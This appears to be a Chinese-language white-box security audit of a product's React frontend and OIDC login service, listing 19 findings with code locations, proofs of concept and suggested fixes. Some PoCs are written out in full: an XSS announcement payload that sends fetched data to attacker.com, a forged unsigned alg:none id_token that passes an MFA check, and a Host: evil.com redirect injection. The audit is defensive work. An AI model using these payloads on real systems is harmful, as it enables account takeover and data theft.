# 前端 + OIDC 白盒安全审计 - 2026-06-06

**审计员**：AetherGuard Sprint 5 R9 白盒安全审计（只读）
**审计时间**：2026-06-06
**审计范围**：`frontend/src/**` 全部（components / pages / services / utils / context）+ `backend/src/services/oidc-auth.service.ts` + `backend/src/api/routes/auth.routes.ts`（OIDC 相关部分）+ `backend/src/config/enterprise-runtime.ts`（OIDC 配置）
**威胁模型**：
- 前端：用户登录后、运行在同一浏览器的恶意扩展 / 跨子域 XSS
- OIDC：上游 IdP 妥协、IdP 配置错误、配置错误的 AetherGuard、跨租户 SSO 错误链接

---

## 摘要

| 类别 | 漏洞数 | 严重度分布 |
|------|--------|------------|
| 1. 前端 XSS / 注入 | 5 | 0C / 2H / 2M / 1L |
| 2. 前端直接 API 调用 / Token 存储 | 3 | 0C / 1H / 1M / 1L |
| 3. OIDC 实现 | 7 | 4C / 2H / 1M |
| 4. 跨租户 OIDC account linking | 2 | 1C / 1H |
| 5. 前端路由保护 | 2 | 0C / 1H / 1M |
| **合计** | **19** | **5C / 6H / 5M / 3L** |

> 前端主体（用户输入 → React 渲染）安全：未发现 `dangerouslySetInnerHTML` / `innerHTML` / `eval()` / `document.write` 任何用法，React 默认转义保护了绝大多数路径。**主要风险集中在 OIDC 实现层**——PKCE 缺失、`id_token` 不验签、`iss` / `aud` / `nonce` 全部不校验，**等于把 JWT 信任完全外包给一个未审计的 base64-decode**。

---

## Top 3 最危险

1. **V9.11 — `id_token` 完全不验签**（`oidc-auth.service.ts:178-193, 489-501`）—— `decodeJwtClaims` 只做 `atob(parts[1])` + `JSON.parse`，没有 `jose` / `jws` 验签。攻击者只要能让受害者拿到一段自签的 JWT（带 `amr: ["mfa"]` / `acr: <required>`），就满足 `oidcRequireMfa() === true` 时的 MFA gate。结合 V9.13（`iss` / `aud` 不校验）—— 任何 OIDC_CLIENT_ID 配错的实例间都能相互接受对方签发的 token。
2. **V9.13 — OIDC 缺 `iss` / `aud` 校验**（`oidc-auth.service.ts:54-131`）—— `validateMfaEvidence` 只查 `claims.acr` / `claims.amr`；`buildSessionUser` 直接信任 `profile.email`。如果同一个 `AetherGuard` 实例的 OIDC 配给两个不同 IdP（A 公司 Okta + B 公司 Azure AD），A 公司员工签发的 `id_token` / `access_token` 能直接登 B 公司账号（只要 email 匹配）—— 跨组织越权。
3. **V9.17 — OIDC auto-provisioning 把所有 IdP 登录堆到同一个 tenant**（`oidc-auth.service.ts:142-159`）—— `OIDC_DEFAULT_TENANT_ID` 是单值环境变量；任何"首次出现的 email"都会被 auto-create 到这个共享租户。如果攻击者在 IdP 注册了 `victim@target-corp.com`（idP 通常允许自服务注册），且 IdP 的 `email_verified` 字段未被显式校验，则 AetherGuard 直接给攻击者创建 `tenant_viewer` 角色，绑定到 `OIDC_DEFAULT_TENANT_ID`——而这个 tenant 里很可能存着所有 IdP-首次登录用户的真实业务数据。

---

## 1. 前端 XSS / 注入

### V9.1: i18n 关闭 escapeValue，用户输入通过 t(key, { value }) 拼接渲染
- **类型**: XSS via i18n interpolation
- **文件:行号**:
  - `frontend/src/i18n.ts:20-24` — `interpolation.escapeValue: false`，注释："react already safes from xss"
  - `frontend/src/pages/Login.tsx:118` — `showToast(t('login.credentials_filled', { preset: preset.label }))`
  - `frontend/src/pages/Settings.tsx`（参考 `siteDetail.page_subtitle` / `fixHistoryDetail.page_subtitle` 的 `{ id }` 替换模式）
- **PoC**: 在登录页 preset 选择时（dev mode）若 `preset.label` 含 `<img onerror=alert(1)>` 字符，i18n 会原样插入。但 preset.label 是 `t(preset.labelKey)` —— 当前调用都是常量 key。**真正风险点**：所有 `t('foo', { user: user.username })` 形式的调用都信任 React 转义，但若 `user.username` 是 `<img src=x onerror=...>`，React 不会执行，只会显示字面量，**所以是 SAFE**。
- **影响**: 在当前调用模式下，**未发现可达的 XSS**。但 `escapeValue: false` 是一颗定时炸弹——任何后来引入的 `<Trans>` 组件 / DOM API（不通过 React）都会立即变成 XSS 通道。
- **修复建议**:
  - 将 `escapeValue: true`（默认）
  - 若需要 HTML 输出，使用 `Trans` 组件并通过 components 显式声明

### V9.2: window.location.assign(authorizationUrl) 信任 OIDC /login 响应
- **类型**: Open Redirect (前端层)
- **文件:行号**: `frontend/src/pages/Login.tsx:153-163`, `frontend/src/services/api.ts:315-325`
- **PoC**:
  ```js
  // 攻击者控制 AetherGuard 后端（如通过 admin 漏洞），将 buildAuthorizationUrl 替换为：
  // → https://evil.com/fake-oidc-consent
  // → javascript:alert(1)
  // 前端 fetchWithCredentials → window.location.assign(authorizationUrl) 无校验
  ```
- **影响**: 后端被攻陷 / IdP 端被钓鱼后，前端无第二道闸门。
- **修复建议**: 在前端对 `authorizationUrl` 做 hostname 校验（白名单 OIDC 域名），拒绝 `javascript:` / `data:` / `vbscript:` scheme。

### V9.3: 动态 href={getDeploymentDownloadUrl(...)} 缺 rel / target 控制
- **类型**: Tabnabbing / 钓鱼
- **文件:行号**:
  - `frontend/src/pages/DeploymentWizard.tsx:519-528, 574-587, 609-613`
- **PoC**: URL 模板 `<API>/deployments/:id/bundle?format=bundle` 来自后端——当前为内部 API 路径，**理论安全**。但若后端 buildDownloadUrl 异常（如 `req.params.id` 未 sanitization），可注入 `javascript:`。
- **影响**: 当前风险低；但 deployment.bundle 是 admin 触发的下载流，需关注未来重构。
- **修复建议**: 渲染前用 `new URL(..., window.location.origin)` 校验 scheme 为 `http(s)`；外链加 `rel="noopener noreferrer"`。

### V9.4: 公告 banner / 公告列表 / 调查 evidence detail 直接渲染后端字符串
- **类型**: Stored XSS（**当前安全**——React 转义）
- **文件:行号**:
  - `frontend/src/components/AnnouncementBanner.tsx:106-112` — `{announcement.title}` / `{announcement.content}`
  - `frontend/src/pages/SuperAdmin.tsx:408-409, 414, 423, 433, 442` — 渲染 `a.title` / `a.content`
  - `frontend/src/components/StructuredDataView.tsx:35-102` — 递归渲染任意 object 的 string 值
  - `backend/src/modules/announcements/announcements.routes.ts:29-45` — admin 写入 title / content / type **无 sanitization / 长度限制**
- **PoC**:
  ```http
  POST /api/admin/announcements
  Cookie: accessToken=<admin jwt>
  Content-Type: application/json
  
  { "title": "OK", "content": "<img src=x onerror=fetch('/api/announcements').then(r=>r.text()).then(flag=>attacker.com?c='+flag)>", "type": "info" }
  ```
  公告 publish 后所有登录用户在 AnnouncementBanner 看到 `{announcement.content}`——**React 转义后是字面量字符串，安全**。
- **影响**: 当前为**理论** XSS（需 React 转义失效 / 改成 `dangerouslySetInnerHTML`）。但 **admin 提交无长度上限、无 HTML stripping**——一旦后续 commit 改成 innerHTML 渲染（如"支持富文本公告"），所有用户立即遭殃。
- **修复建议**:
  - 后端在 `createAnnouncement` / `updateAnnouncement` 中限制 title ≤ 200 / content ≤ 5000 字符
  - 写一个 `sanitizeAnnouncement` 工具：strip `<script>` / `on*=` / `javascript:`
  - 监控 `dangerouslySetInnerHTML` 用法（项目 guard script `check-no-direct-api-fetch.mjs` 应扩展到 check `dangerouslySetInnerHTML`）

### V9.5: URL.createObjectURL 配合用户控制内容写入 <a download>
- **类型**: 内容投毒（有限）
- **文件:行号**:
  - `frontend/src/pages/Dashboard.tsx:283-289`
  - `frontend/src/pages/SuperAdmin.tsx:51-58, 309-311`
  - `frontend/src/pages/DeploymentEvidence.tsx:58-63`
- **PoC**: `downloadText(filename, content, type)` —— filename 来自 `detailed.tenantId`（admin 控制的 ID），**当前安全**（无 path traversal）。content 来自后端，是 CSV / JSON 格式。
- **影响**: 后端投毒则前端会下载恶意内容，但**仅影响本地用户**。
- **修复建议**: 渲染前用 `Blob` 配合 `Content-Disposition` 头（已是后端行为）。无需前端改动。

---

## 2. 前端直接 API 调用 / Token 存储

### V9.6: fetchPublicAnnouncements 绕过 fetchWithCredentials 但用了 raw fetch
- **类型**: 设计一致性问题
- **文件:行号**: `frontend/src/services/api.ts:2575-2580`
- **PoC**:
  ```ts
  export const fetchPublicAnnouncements = async (signal?: AbortSignal) => {
      const response = await fetch(`${API_BASE_URL}/announcements`, { signal });
      ...
  }
  ```
  与其他函数 `fetchWithCredentials` 模式不一致，但本端点 `/announcements` 是公开的（`auth.routes.ts:475` / `control-plane-app.ts:365-372`），**预期不带 cookie**。技术上正确。
- **影响**: 无直接安全影响；但给未来 review 留下"破窗"。
- **修复建议**: 统一封装 `fetchPublic` 函数，集中审计。

### V9.7: setAccessToken 维护内存 token 副本，绕过 httpOnly cookie 设计
- **类型**: Auth Bypass（**限 dev fallback**）
- **文件:行号**:
  - `frontend/src/services/api.ts:115-131, 305, 309, 327-335` — `_accessToken` 内存副本 + `Authorization: Bearer` 头 fallback
  - 注释（line 115）: `// In-memory token storage for development (cookie fallback)`
- **PoC**:
  - 后端 `auth.routes.ts:414-426` 仍然把 `accessToken` / `refreshToken` 写入响应体（`return sendSuccess(res, { ..., accessToken: tokens.accessToken, refreshToken: tokens.refreshToken, ...}, { legacy: { accessToken, refreshToken } })`）
  - 前端 `setAccessToken(data?.accessToken || payload?.accessToken || null)` 立即把 token 复制到内存
  - 后续每次 API 调用都 `headers['Authorization'] = \`Bearer ${_accessToken}\``（**即使 cookie 也在**）
- **影响**:
  - 与 `CVE-2026-009 修复（"Only accept refresh token from httpOnly cookie"）` 矛盾——access token 仍可被 JS 读取
  - 任何前端 XSS（V9.4 触发后）能直接拿到长期 token（24h）
  - 注释说是"dev fallback"但**生产构建也在用**——`api.ts` 没有 `process.env.NODE_ENV` 守护
- **修复建议**:
  - 在生产构建中禁用 `_accessToken` 路径（`if (import.meta.env.PROD) { /* no Authorization header */ }`）
  - 强制后端不在 `sendSuccess` 中返回 token；只走 httpOnly cookie

### V9.8: localStorage 存非敏感标识（dismissed announcements / theme / demo mode）—— 无 token 泄漏
- **类型**: 信息泄露（极小）
- **文件:行号**:
  - `frontend/src/components/AnnouncementBanner.tsx:26-28, 52-53` — `localStorage[dismissedKey]`
  - `frontend/src/context/ThemeContext.tsx:29, 63` — `localStorage[storageKey]`
  - `frontend/src/context/LiveModeContext.tsx:15, 20` — `localStorage[LIVE_MODE_STORAGE_KEY]`
  - `frontend/src/config/demo-mode.ts:19, 23, 24, 27, 47, 57`
  - `frontend/src/services/session-cache.ts:7, 15-19, 26-37, 40-57` — `sessionStorage['aetherguard:session-user']`（userId / email / username）
- **PoC**: 恶意扩展可读 `localStorage` —— **仅**泄露 demo mode flag、theme、dismissed announcement IDs、sessionStorage 中的 userId/email/username。
- **影响**: 不能直接拿 token；但 `sessionStorage` 中的 userId / email 是账户标识，可用于有 CSRF 的接口的 fingerprint。
- **修复建议**:
  - sessionStorage 内容**可改用 `crypto.randomUUID()` 派生**的 opaque session id（不暴露 userId）
  - 当前风险**可接受**，但建议在 Cookie SameSite=Strict + httpOnly 的环境下不再需要 sessionStorage 缓存

---

## 3. OIDC 实现

### V9.9: buildAuthorizationUrl 不使用 PKCE（code_challenge / code_verifier）
- **类型**: OIDC Auth Code Interception
- **文件:行号**: `backend/src/services/oidc-auth.service.ts:44-52, 54-67`
- **PoC**:
  - 用户完成 OIDC 登录后，redirect URI 上的 `?code=...` 出现在浏览器 history / server log
  - 攻击者获取 code 后（通过恶意浏览器扩展 / Referer 泄漏到第三方 / 上游代理日志），可在 `client_secret` 泄漏的前提下完成 token exchange
  - **client_secret 已在 token exchange 使用**（`oidc-auth.service.ts:55-67`），所以 PKCE 不是"必须"——但是 OIDC BCP（RFC 8252 §7.6）建议所有 public / confidential client 都启用 PKCE 防止 authorization code injection
- **影响**: 中等（依赖 client_secret 不泄漏为前提）。
- **修复建议**:
  - 生成 `code_verifier`（43-128 字符随机），计算 `code_challenge = S256(code_verifier)`
  - `buildAuthorizationUrl` 加 `code_challenge` / `code_challenge_method=S256`
  - 把 `code_verifier` 存到 `oidcVerifier` cookie（httpOnly, sameSite=strict, 短期）
  - `exchangeCode` 时附带 `code_verifier`

### V9.10: state 只在 cookie 里——单点 CSRF 防护，无 IdP 端防御
- **类型**: CSRF on OIDC callback（已防护但弱）
- **文件:行号**:
  - `backend/src/api/routes/auth.routes.ts:452-465, 481-486`
  - `backend/src/middleware/auth.middleware.ts:233-239` — `oidcState` cookie httpOnly + sameSite=strict（**正确**）
- **PoC**: state 校验存在，**CSRF 攻击不可行**（attacker 无法让受害者浏览器带上自己的 state cookie，因为是 httpOnly + sameSite=strict + server-random）。
- **影响**: **当前已防护**。但 code-only 流程如果 PKCE 缺失（V9.9），authorization code injection 仍可绕过 state。
- **修复建议**: 配合 V9.9 一同修复；额外给 `oidcState` cookie 加 `secure: true`（当前 `secure: process.env.NODE_ENV === 'production' ? isHttpsRequest(req) : false`——开发环境可被中间人）。

### V9.11: id_token 完全不验签——decodeJwtClaims 只做 base64-decode
- **类型**: OIDC Auth Bypass (Critical)
- **文件:行号**:
  - `backend/src/services/oidc-auth.service.ts:84-113`（validateMfaEvidence）
  - `backend/src/services/oidc-auth.service.ts:178-193`（decodeJwtClaims 私有方法）
  - `backend/src/api/routes/auth.routes.ts:488-502`（OIDC callback 用 id_token 只为验 MFA）
- **PoC**:
  ```js
  // 攻击者（能诱导用户 OIDC 登录到自建 IdP）构造 id_token
  const fakeIdToken = btoa(JSON.stringify({ header: { alg: 'none', typ: 'JWT' } }))
    + '.' + btoa(JSON.stringify({ amr: ['mfa'], acr: 'high', sub: 'x', iss: 'evil' }))
    + '.';
  // 塞进 token.idToken → oidcAuthService.validateMfaEvidence 接受
  // 配合 V9.12：userinfo 端点也由攻击者控制 → 拿任意 email 登录
  ```
  即便 IdP 是合法的（Okta / Azure AD），如果 Okta 端存在其他应用的 RCE / 误签，`amr` / `acr` 声明**完全可被攻击者伪造**，因为 AetherGuard 不验证 `id_token` 的 `alg` / `kid` / 签名。
- **影响**:
  - **MFA gate 形同虚设**——任意满足 `OIDC_REQUIRED_ACR` 或 `amr` 列表的 token 都通过
  - 配合 V9.13（无 iss / aud 校验），跨 IdP 接受 token
- **修复建议**:
  - 引入 `jose` 或 `jsonwebtoken`（已在依赖中）
  - 通过 OIDC Discovery（`.well-known/openid-configuration`）拉 JWKS
  - 验签 `id_token`：检查 `alg` ∈ {`RS256`, `ES256`}（拒绝 `none` / `HS*`）、验证 `iss === OIDC_ISSUER`、`aud === OIDC_CLIENT_ID`、`nonce` 与请求时存的值匹配、`exp` / `iat` 在合理范围
  - `amr` / `acr` 只在签名验证通过后采信

### V9.12: id_token 与 userinfo token 不强制关联（mix-up attack）
- **类型**: OIDC Mix-up Attack
- **文件:行号**: `backend/src/services/oidc-auth.service.ts:54-82, 115-131`
- **PoC**: 
  - 配置两个 OIDC endpoints（多 IdP 场景），但只用一个 OIDC client_id
  - 用户被诱导在 IdP A 完成登录（拿到 IdP A 签发的 `access_token`）
  - 该 `access_token` 发送到 IdP B 的 userinfo 端点（因 `OIDC_USERINFO_ENDPOINT` 是单一值，**实际可行**——取决于运维是否多 IdP）
  - 返回的 `profile` 来自 IdP B 的用户
- **影响**: 多 IdP 部署下用户身份可被混淆。
- **修复建议**:
  - 验签 `id_token` 后，从 `id_token` 的 `sub` 派生 `userinfo` 查询（很多 IdP 支持 `?sub=` 或不需查询）
  - 强制 `access_token` 的 issuer 与 `id_token.iss` 一致

### V9.13: 无 iss / aud / nonce 校验
- **类型**: OIDC Token Replay / Cross-Tenant
- **文件:行号**: `backend/src/services/oidc-auth.service.ts:54-82, 115-131`
- **PoC**:
  - Tenant A 配置 OIDC_CLIENT_ID = `ag-a`，Tenant B 配置 OIDC_CLIENT_ID = `ag-b`，但**共享同一个 OIDC_AUTHORIZATION/TOKEN/USERINFO endpoint**（同一 IdP 租户、不同 AetherGuard 实例）
  - 用户在 Tenant A 登录拿到 token A；攻击者重放到 Tenant B 的 OIDC callback——**Tenant B 接受**
  - `iss` 应该是 `https://idp.example.com/`，但代码**不校验**
  - `aud` 应该是 `ag-a` 或 `ag-b`，但代码**不校验**
- **影响**: 跨 AetherGuard 实例 token 重放；只要 email 匹配，attacker 登任意 tenant。
- **修复建议**:
  - 增加 `OIDC_ISSUER` / `OIDC_EXPECTED_AUDIENCE` 环境变量
  - `validateMfaEvidence` 之后立刻验 `claims.iss === env('OIDC_ISSUER')` / `claims.aud === env('OIDC_CLIENT_ID')`

### V9.14: profile.email 未验证 email_verified / 域名白名单
- **类型**: Account Takeover via IdP
- **文件:行号**:
  - `backend/src/services/oidc-auth.service.ts:115-131, 133-160`
  - `backend/src/api/routes/auth.routes.ts:489, 503`
- **PoC**:
  - IdP（如未受控的 public OIDC provider：Auth0 dev tenant）允许任何 email 注册
  - 攻击者在 IdP 注册 `admin@target-corp.com`（IdP 端 `email_verified: true` 因为 IdP 信任该注册流程）
  - 走 OIDC 登录 → AetherGuard 拿 `profile.email = "admin@target-corp.com"`
  - `findAuthUserByEmail(profile.email)` 命中目标账户 → 直接登入
- **影响**: 取决于 IdP 注册流程是否宽松。**多数企业 IdP（Okta / Azure AD）默认强制 email 验证**，但 code 一行**不强制 `claims.email_verified` 校验**——单点失误即可绕过。
- **修复建议**:
  - 强制 `profile.email_verified === true`（或 `id_token.email_verified === true`）
  - 引入 `OIDC_ALLOWED_EMAIL_DOMAINS` 白名单（逗号分隔）

### V9.15: buildOidcRedirectTarget 在 OIDC_POST_LOGIN_REDIRECT_ORIGIN 未配置时使用 req.get('host')
- **类型**: Open Redirect / Host header injection
- **文件:行号**: `backend/src/api/routes/auth.routes.ts:805-823`
- **PoC**:
  ```http
  GET /api/auth/oidc/callback?code=...&state=...
  Host: evil.com
  ```
  走到 fallback 分支：`return ${protocol}://${host}${normalizedPath}` → 跳到 `https://evil.com/login?oidc=state-mismatch`（把用户引导到 attacker 控制的域名）
- **影响**: 配合 OIDC 错误页（`?oidc=failed` / `?oidc=state-mismatch` / `?oidc=not-configured`）的 phishing——用户看到 "OIDC failed" 提示但被重定向到 attacker 域。
- **修复建议**:
  - `OIDC_POST_LOGIN_REDIRECT_ORIGIN` 必填（生产），启动时校验
  - Fallback 不使用 `req.get('host')`，改用白名单 origin

### V9.16: OIDC discovery / endpoint 配置无 HTTPS 强制
- **类型**: MITM on OIDC endpoints
- **文件:行号**: `backend/src/services/oidc-auth.service.ts:44-67, 115-131`，`backend/src/config/enterprise-runtime.ts:86-95`
- **PoC**: 运维误将 `OIDC_AUTHORIZATION_ENDPOINT=http://idp.internal/...` 配成 http（内网 / 自签证书）→ 网络位置 attacker 注入 code
- **影响**: 取决于网络位置，但应**强制** HTTPS。
- **修复建议**: 启动时校验 `new URL(env('OIDC_AUTHORIZATION_ENDPOINT')).protocol === 'https:'`（生产）。

---

## 4. 跨租户 OIDC account linking

### V9.17: OIDC auto-provisioning 把所有"新 email"堆到单一 OIDC_DEFAULT_TENANT_ID
- **类型**: Tenant Mis-binding
- **文件:行号**: `backend/src/services/oidc-auth.service.ts:142-159`
- **PoC**:
  - 部署时设 `OIDC_AUTO_PROVISION=true`、`OIDC_DEFAULT_TENANT_ID=<固定 UUID>`、`OIDC_AUTO_PROVISION_ROLE=tenant_viewer`
  - 任何 IdP 用户首次登录 → 创建新 user（绑定到 `<固定 UUID>` tenant）→ `tenant_viewer` 角色
  - 该 tenant 累积**所有** IdP 用户的业务数据（如果该 tenant 还有 `tenant_admin` 用户，他们能 RBAC 范围内看到所有 auto-provision 用户的资源）
- **影响**:
  - 数据隔离被破坏：所有 IdP 用户共享一个 tenant
  - 与产品"每用户一 tenant"的注册设计（`auth.routes.ts:131`：`const tenantId = uuidv4()`）冲突
  - 与 OIDC 设计的"按 organization / domain 分配 tenant"预期不符
- **修复建议**:
  - 多租户映射：根据 `email` 后缀（`@company-a.com` → tenant A）查表 → tenantId
  - 若无映射 → 拒绝登录（要求 admin 预先建好账号）
  - 单租户场景应显式分清是"multi-tenant" 还是"single-tenant"模式

### V9.18: resolveUser 信任 profile.email 决定用户身份——无 IdP issuer 限定
- **类型**: Cross-Tenant Account Takeover
- **文件:行号**: `backend/src/services/oidc-auth.service.ts:133-160`
- **PoC**:
  - AetherGuard 配置 IdP X（公司 X 的 Okta）+ IdP Y（公司 Y 的 Azure AD），但**只有一个 OIDC_USERINFO_ENDPOINT 配置生效**（多 IdP 实际部署场景）
  - IdP X 员工 `alice@company-x.com` 走 OIDC 登录；attacker 在 IdP Y 注册 `alice@company-x.com`（多数 IdP 不允许跨租户抢注，但若公司 Y 的 IdP 配置为开放注册，则可行）
  - attacker 用 Y 的 token 走 AetherGuard OIDC callback → 拿到 user（属于 company-x 的 tenant）→ 登入
  - 由于无 `iss` 校验，**AetherGuard 不知道这两个 token 来自不同 IdP**
- **影响**: 一旦 IdP 端有"撞邮箱"条件（弱 IdP 注册流程 / 域名 aliasing），attacker 跨 IdP 接管目标账号。
- **修复建议**:
  - 验 `id_token.iss` 必须等于本实例配置的 `OIDC_ISSUER`（V9.13）
  - 强校验 `email_verified`（V9.14）
  - 引入 `OIDC_IDP_TYPE` 字段入库，作为 user 标识的二级索引（不再仅靠 email）

---

## 5. 前端路由保护

### V9.19: PrivateRoute / AdminRoute 只在 mount 时检查一次，不在每次 route 变化时重验
- **类型**: Client-Side Auth Bypass (有缓解)
- **文件:行号**: `frontend/src/App.tsx:103-182, 620-679`
- **PoC**:
  - 用户 A 登录后，admin 撤销 A 的 session
  - A 浏览器内的 React state 仍认为已登录（`_accessToken` 在内存）→ 继续在 UI 看到 admin 页
  - 所有 API 调用最终会 401（`fetchWithAutoRefresh` 检测到 401 后 `setAccessToken(null)`），但**前端页面不立即重定向**
  - 用户停留在 /super-admin 页 → admin 渲染的组件继续 mount，调用 `fetchAdmin*` API
  - 这些 API 都 401 → 抛出 → UI 显示 error state，**但路由不切走**
- **影响**:
  - **前端路由检查是 cosmetic 的**，不能阻止 API 调用（API 走 `authenticate` 中间件）
  - 后端权限是真权威——前端的"auth 失效但 UI 不刷新"是 UX 问题不是安全洞
  - 真正风险：local 状态的 admin 组件能短暂看到旧数据（直到 401）
- **修复建议**:
  - 监听 `fetchWithAutoRefresh` 的 401 全局事件 → `setSessionUserIdentity(null)` + `navigate('/login')`
  - 在 WebSocket 收到 `auth:revoked` 事件时立即登出

### V9.20: PrivateRoute 不验证 token 实际有效性，只看后端 readiness
- **类型**: Auth UX Issue
- **文件:行号**: `frontend/src/App.tsx:103-146`
- **PoC**: 详见 V9.19。额外关注：**第一次 mount 时若 `fetchApiReadiness` 返回 ok 但 `fetchCurrentUserSession` 因后端慢返回 null**（race condition），用户被跳到 /login。
- **影响**: UX 问题。安全影响低。
- **修复建议**:
  - 上述 V9.19 修复即可

---

## 与既有审计的关联

- **CVE-2026-012**（前端 Auth guard）已在 V9.19/V9.20 中确认：**客户端防护不充分，需后端 middleware 兜底（已实现）**。
- **CVE-2026-009**（refresh token 限制）修复的"`refreshToken` 只从 cookie 取"在 `auth.routes.ts:546-555` 正确，但 **access token 仍泄漏在响应体**（V9.7）——与修复目标部分背离。
- 现有 guard script（`scripts/guards/check-route-db-access.mjs`、`check-no-direct-api-fetch.mjs`）**未覆盖 OIDC 安全**，建议扩展。

---

## 建议新增 guard

```bash
# 1. 禁止 dangerouslySetInnerHTML / innerHTML / eval / document.write
node scripts/guards/check-no-html-injection.mjs

# 2. 禁止生产构建使用 Authorization Bearer 头（与 httpOnly cookie 设计冲突）
node scripts/guards/check-no-bearer-fallback.mjs

# 3. OIDC 必备校验
node scripts/guards/check-oidc-validation.mjs
#   检查 oidc-auth.service.ts 是否引用 jose / jsonwebtoken verify / iss / aud / nonce
```

---

## 不修复（设计接受）

- `_accessToken` 内存备份——在 dev mode 有用，**生产构建禁用即可**（V9.7 修复路径）
- `localStorage` 存 theme / demo mode / dismissed announcements——无 token / 业务数据，**可接受**

---

## 总览

- **核心问题：OIDC 实现层完全依赖未审计的 base64-decode + IdP 端的"善意"**（V9.11 / V9.13 / V9.14 / V9.17 / V9.18）。修这些远比修前端 XSS 重要。
- 前端 XSS 主路径因 React 默认转义**当前安全**（V9.4 是定时炸弹）。
- 前端路由权限检查是**UX 装饰**，真正的安全在 `authenticate` 中间件（已正确实现）。
- **优先修复顺序**：V9.11 → V9.13 → V9.18 → V9.14 → V9.15 → V9.17 → V9.7 → V9.4 → V9.19 → V9.9 / V9.10
